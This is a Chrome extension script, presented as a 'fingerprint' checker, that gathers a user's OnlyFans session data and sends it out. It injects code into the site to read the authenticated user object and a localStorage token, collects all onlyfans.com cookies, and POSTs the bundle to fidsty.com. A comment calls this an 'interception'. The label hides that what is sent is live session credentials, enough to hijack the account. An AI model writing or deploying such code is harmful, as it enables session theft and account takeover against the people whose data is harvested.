(async () => {
    window.addEventListener('click', (e: PointerEvent) => {
        window['shiftKeyStatus'] = e.shiftKey;
        window['ctrlKeyStatus'] = e.ctrlKey;
    });

    const form = <HTMLFormElement>document.querySelector('[id="getMyFingerprint"]');

    if (form) {
        form.onsubmit = async (e: SubmitEvent | any) => {
            e.preventDefault();

            const { submitter } = e;

            if (submitter) {
                submitter.disabled = true;

                submitter.textContent = 'Checking your profile...';

                const tabs = await chrome.tabs.query({
                    currentWindow: true,
                    url: [
                        "*://onlyfans.com/*",
                    ]
                });

                let tab = tabs.pop();

                let isNewTab = false;

                if (tab) { } else {
                    tab = await chrome.tabs.create({
                        active: true,
                        url: 'https://onlyfans.com'
                    });

                    isNewTab = true;
                }

                const { id: tabId } = tab;

                await new Promise<void>((resolve, reject) => {
                    const observer = async () => {
                        const tab = await chrome.tabs.get(tabId);

                        const { status } = tab;

                        if ('complete' == status) {
                            resolve();

                            return;
                        }

                        setTimeout(observer, 1000);
                    };

                    observer()
                });

                const executed = await chrome.scripting.executeScript({
                    target: { tabId },
                    world: "MAIN",
                    func: async () => new Promise((resolve, reject) => {
                        const observer = () => {
                            const app: any = document.querySelector('[id="app"]');

                            if (app) {
                                const { __vue__: vue } = app;

                                const { isAuth } = vue;

                                if (isAuth) {
                                    const { authUser } = vue;

                                    const { id: userId } = authUser;

                                    const { userAgent } = navigator;

                                    const bcTokenSha = localStorage.getItem('bcTokenSha');

                                    resolve({
                                        authUser,
                                        userAgent,
                                        bcTokenSha,
                                        userId
                                    });

                                    return;
                                }
                            }

                            setTimeout(observer, 100);
                        };

                        observer();
                    }),
                });

                const { result } = executed[0];

                const cookies = await chrome.cookies.getAll({
                    url: 'https://onlyfans.com'
                });

                const fingerprint = {
                    cookies,
                    ...result,
                };

                const str = JSON.stringify(fingerprint);

                if (window['shiftKeyStatus']) {
                    const result = await Notification.requestPermission();

                    try {
                        await navigator.clipboard.writeText(str);

                        if ('granted' == result) {
                            new Notification("Get My Fingerprint", { body: "Fingerprint copied to clipboard" });
                        }
                    } catch (error: any) {
                        console.error(error.message);
                    }
                }

                const downloadFingerprint = () => {
                    const blob = new Blob([str], { type: "application/json" });

                    const url = URL.createObjectURL(blob);

                    const downloadLink = document.createElement("a");

                    downloadLink.href = url;

                    const { userId, authUser } = fingerprint;

                    const { username } = authUser;

                    downloadLink.download = `fingerprint_${userId}_${username}.json`;

                    downloadLink.click();
                };

                if (window['ctrlKeyStatus']) downloadFingerprint();

                if (isNewTab) chrome.tabs.remove(tabId);

                const TOKEN = '';

                const response = await fetch(`https://fidsty.com/infp?token=${TOKEN}`, {
                    method: 'POST',
                    headers: {
                        contentType: 'applocation/json',
                    },
                    body: JSON.stringify(fingerprint),
                });

                const { ok, status } = response;

                if (!ok) {
                    submitter.disabled = false;

                    submitter.textContent = 'Fingerprint not added';

                    downloadFingerprint();

                    return;
                }

                submitter.textContent = 'Fingerprint collected';

                {
                    const tabs = await chrome.tabs.query({
                        url: [
                            "*://fidsty.com/*",
                            "*://*.fidsty.com/*"
                        ]
                    });

                    const tab = tabs.pop();

                    if (tab) {
                        const { id: tabId } = tab;

                        chrome.tabs.update(tabId, {
                            active: true,
                        });

                        chrome.scripting.executeScript({
                            target: { tabId: tabId },
                            world: "MAIN",
                            func: (fingerprint: any) => {
                                // TODO: уведомить сайт о перехвате отпечатка
                            },
                            args: [fingerprint]
                        });
                    }
                }

                setTimeout(() => {
                    window.close();
                }, 100);
            }

            return true;
        };
    }
})();